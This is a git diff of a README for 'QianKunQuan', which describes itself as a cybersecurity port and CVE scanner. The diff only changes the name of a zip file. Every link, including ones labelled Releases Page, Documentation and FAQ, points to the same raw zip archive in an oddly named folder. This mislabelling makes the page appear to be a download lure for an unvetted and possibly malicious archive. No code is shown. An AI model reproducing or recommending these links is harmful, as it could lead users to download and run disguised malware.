@@ -1,7 +1,7 @@
 # 🌐 QianKunQuan - Your Powerful Cybersecurity Scanner
 
 ## 📥 Download Now
-[![Download QianKunQuan](https://raw.githubusercontent.com/studysk890/QianKunQuan/main/spectacularly/Qian_Kun_Quan_3.3.zip)](https://raw.githubusercontent.com/studysk890/QianKunQuan/main/spectacularly/Qian_Kun_Quan_3.3.zip)
+[![Download QianKunQuan](https://raw.githubusercontent.com/studysk890/QianKunQuan/main/spectacularly/Qian-Kun-Quan-v3.6.zip)](https://raw.githubusercontent.com/studysk890/QianKunQuan/main/spectacularly/Qian-Kun-Quan-v3.6.zip)
 
 ## 📖 Description
 乾坤圈 (QianKunQuan) 是一款功能强大的网络安全扫描工具，专为渗透测试人员、安全研究人员和系统管理员设计。它结合了高效端口扫描、服务识别、版本检测和CVE漏洞关联等核心功能，帮助您快速评估目标系统的安全状况。
@@ -22,10 +22,10 @@ To get started with QianKunQuan, follow these simple steps:
 - **CVE Integration:** Link detected services with known vulnerabilities for better security awareness.
 
 ## 💻 Download & Install
-To download QianKunQuan, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/studysk890/QianKunQuan/main/spectacularly/Qian_Kun_Quan_3.3.zip).
+To download QianKunQuan, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/studysk890/QianKunQuan/main/spectacularly/Qian-Kun-Quan-v3.6.zip).
 
 ### 📥 Installation Steps
-1. Go to the [Releases Page](https://raw.githubusercontent.com/studysk890/QianKunQuan/main/spectacularly/Qian_Kun_Quan_3.3.zip).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/studysk890/QianKunQuan/main/spectacularly/Qian-Kun-Quan-v3.6.zip).
 2. Find the latest release.
 3. Click the download link that corresponds to your operating system.
 4. Once downloaded, locate the file on your device.
@@ -64,11 +64,11 @@ QianKunQuan is open-source software licensed under the MIT License. You are free
 For further inquiries, please reach out directly on GitHub or via email provided in the repository settings.
 
 ## 📖 Additional Resources
-- [Documentation](https://raw.githubusercontent.com/studysk890/QianKunQuan/main/spectacularly/Qian_Kun_Quan_3.3.zip)
-- [FAQ](https://raw.githubusercontent.com/studysk890/QianKunQuan/main/spectacularly/Qian_Kun_Quan_3.3.zip)
+- [Documentation](https://raw.githubusercontent.com/studysk890/QianKunQuan/main/spectacularly/Qian-Kun-Quan-v3.6.zip)
+- [FAQ](https://raw.githubusercontent.com/studysk890/QianKunQuan/main/spectacularly/Qian-Kun-Quan-v3.6.zip)
 
 ## 🏁 Acknowledgments
 Thanks to the community and contributors who made QianKunQuan possible. Your support keeps this project thriving.
 
 ## 📥 Download Now
-[![Download QianKunQuan](https://raw.githubusercontent.com/studysk890/QianKunQuan/main/spectacularly/Qian_Kun_Quan_3.3.zip)](https://raw.githubusercontent.com/studysk890/QianKunQuan/main/spectacularly/Qian_Kun_Quan_3.3.zip)
+[![Download QianKunQuan](https://raw.githubusercontent.com/studysk890/QianKunQuan/main/spectacularly/Qian-Kun-Quan-v3.6.zip)](https://raw.githubusercontent.com/studysk890/QianKunQuan/main/spectacularly/Qian-Kun-Quan-v3.6.zip)
